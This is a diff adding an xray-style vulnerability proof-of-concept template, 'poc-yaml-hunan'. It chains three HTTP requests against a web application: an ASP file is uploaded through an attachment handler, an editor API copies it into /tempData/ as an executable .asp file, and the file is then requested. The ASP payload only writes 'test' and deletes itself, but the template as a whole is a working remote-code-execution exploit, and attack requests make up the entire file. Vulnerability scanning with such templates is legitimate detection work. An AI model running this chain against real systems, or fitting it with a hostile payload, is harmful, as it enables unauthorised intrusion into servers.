@@ -1,0 +1,80 @@
+name: poc-yaml-hunan
+transport: http
+set:
+  file_name: randomLowercase(8)
+  file_boundary: randomLowercase(40)
+rules:
+  r0:
+    request:
+      read_timeout: 3
+      dial_timeout: 5
+      method: POST
+      path: /Applications/Attachment/upload.ashx
+      follow_redirects: false
+      headers:
+        Content-Type: >-
+          multipart/form-data;
+          boundary=------------------------{{file_boundary}}
+        User-Agent: >-
+          Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+          like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Accept: >-
+          text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+      body: >
+        --------------------------{{file_boundary}}
+
+        Content-Disposition: form-data;
+        name="file";filename="{{file_name}}.txt"
+
+        
+        <%
+
+        response.write("test")
+
+        Server.CreateObject("Scripting.FileSystemObject").DeleteFile(Request.ServerVariables("PATH_TRANSLATED"))
+
+        %>
+
+        --------------------------{{file_boundary}}
+
+        Content-Disposition: form-data; name="_upload_guid"
+        
+
+        {{file_name}}
+
+        --------------------------{{file_boundary}}--
+    expression: response.status == 200 && response.body_string.contains(string(file_name))
+  r1:
+    request:
+      read_timeout: 4
+      method: POST
+      path: /Standard/Editor/API/File.cshtml?act=geturl
+      follow_redirects: false
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+        Accept: >-
+          text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        User-Agent: >-
+          Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+          like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        X-Forwarded-Proto: ''
+      body: >-
+        filename=/tempData/{{file_name}}.asp&filetplpath=/tempData/{{file_name}}.txt
+    expression: response.status == 200 && response.body_string.contains(string(file_name))
+  r2:
+    request:
+      read_timeout: 2
+      method: GET
+      path: /tempData/{{file_name}}.asp
+      follow_redirects: false
+      headers:
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+        Accept: >-
+          text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    expression: response.status == 200 && response.body_string.contains(string(file_name))
+expression: r0() && r1() && r2()
+detail:
+  author: flower
+  links:
+    - https://mp.weixin.qq.com/s/wyMzLUFG8egtum_LkRUQCA
+
